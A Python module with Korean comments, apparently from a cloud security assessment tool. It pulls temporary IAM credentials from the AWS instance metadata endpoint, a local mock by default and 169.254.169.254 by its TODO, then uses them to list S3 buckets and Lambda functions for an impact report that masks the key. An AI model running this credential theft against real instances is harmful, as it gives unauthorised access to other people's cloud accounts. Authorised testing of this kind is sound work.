"""
aws/cloud.py
IMDS 자격증명 탈취 + S3/Lambda 접근 범위 점검

- 로컬 개발 단계에서는 mock_imds.py 로 가짜 엔드포인트를 띄워서 테스트합니다.
- AWS 확장 단계에서는 실제 IMDSv1 엔드포인트(169.254.169.254)를 사용합니다.

주의: 실제 AWS 자격증명(Access Key, Secret Key)은 절대 print/커밋/결과 JSON에
그대로 남기지 않습니다. (마스킹 처리 필수)
"""

import requests
import boto3

# TODO: 로컬 mock 단계에서는 이 값을, AWS 연동 단계에서는 169.254.169.254 로 변경
IMDS_BASE_URL = "http://127.0.0.1:5001"


def mask_secret(value: str, visible_chars: int = 4) -> str:
    """자격증명 값을 로그/결과에 남길 때 마스킹 처리합니다."""
    if not value or len(value) <= visible_chars:
        return "****"
    return value[:visible_chars] + "*" * (len(value) - visible_chars)


def get_imds_credentials() -> dict:
    """
    IMDS에서 임시 자격증명을 탈취(조회)합니다.
    IMDSv1 흐름:
    1. /latest/meta-data/iam/security-credentials/ 로 역할 이름(role name) 조회
    2. 해당 역할 이름으로 /latest/meta-data/iam/security-credentials/<role_name> 조회
       -> AccessKeyId, SecretAccessKey, Token 반환
    """
    try:
        role_response = requests.get(
            f"{IMDS_BASE_URL}/latest/meta-data/iam/security-credentials/", timeout=3
        )
        role_name = role_response.text.strip()

        cred_response = requests.get(
            f"{IMDS_BASE_URL}/latest/meta-data/iam/security-credentials/{role_name}",
            timeout=3,
        )
        credentials = cred_response.json()

        return {
            "role_name": role_name,
            "access_key_id": credentials.get("AccessKeyId"),
            "secret_access_key": credentials.get("SecretAccessKey"),
            "session_token": credentials.get("Token"),
        }
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}


def check_s3_access(credentials: dict) -> dict:
    """탈취한 임시 자격증명으로 실제 접근 가능한 S3 버킷 범위를 점검합니다."""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials["access_key_id"],
            aws_secret_access_key=credentials["secret_access_key"],
            aws_session_token=credentials["session_token"],
        )
        s3_client = session.client("s3")
        response = s3_client.list_buckets()
        bucket_names = [b["Name"] for b in response.get("Buckets", [])]
        return {"accessible": True, "buckets": bucket_names}
    except Exception as e:
        return {"accessible": False, "error": str(e)}


def check_lambda_access(credentials: dict) -> dict:
    """탈취한 임시 자격증명으로 실제 접근 가능한 Lambda 함수 범위를 점검합니다."""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials["access_key_id"],
            aws_secret_access_key=credentials["secret_access_key"],
            aws_session_token=credentials["session_token"],
        )
        lambda_client = session.client("lambda")
        response = lambda_client.list_functions()
        function_names = [f["FunctionName"] for f in response.get("Functions", [])]
        return {"accessible": True, "functions": function_names}
    except Exception as e:
        return {"accessible": False, "error": str(e)}


def build_impact_report(credentials: dict) -> dict:
    """IMDS 탈취부터 S3/Lambda 영향도까지 묶어서 하나의 리포트로 만듭니다."""
    s3_result = check_s3_access(credentials)
    lambda_result = check_lambda_access(credentials)

    return {
        "role_name": credentials.get("role_name"),
        "access_key_id_masked": mask_secret(credentials.get("access_key_id", "")),
        "s3": s3_result,
        "lambda": lambda_result,
    }


if __name__ == "__main__":
    # 단독 실행 테스트용
    creds = get_imds_credentials()
    if "error" in creds:
        print(f"자격증명 탈취 실패: {creds['error']}")
    else:
        print(f"자격증명 탈취 성공 (역할: {creds['role_name']})")
        report = build_impact_report(creds)
        print(report)